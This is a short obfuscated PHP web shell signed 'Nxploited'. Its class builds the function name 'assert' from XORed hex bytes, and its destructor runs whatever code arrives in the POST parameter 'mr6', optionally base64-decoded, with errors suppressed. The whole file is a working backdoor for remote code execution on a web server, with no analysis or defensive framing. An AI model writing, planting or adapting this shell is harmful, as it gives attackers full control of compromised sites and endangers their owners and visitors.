<?php 
class VNJD { 
    function iEhu() {
        $Mmqu = "\x36" ^ "\x57";
        $KVaC = "\x88" ^ "\xfb";
        $VjEC = "\xc0" ^ "\xb3";
        $Wtre = "\xd3" ^ "\xb6";
        $Uynf = "\x46" ^ "\x34";
        $qWwZ = "\x37" ^ "\x43";
        $SUGK =$Mmqu.$KVaC.$VjEC.$Wtre.$Uynf.$qWwZ;
        return $SUGK;
    }
    function __destruct(){
        $GEeV=$this->iEhu();
        @$GEeV($this->Cf);
    }
}
$vnjd = new VNJD();
@$vnjd->Cf = isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
?>
<?php echo '<b>Nxploited</b>'; ?>
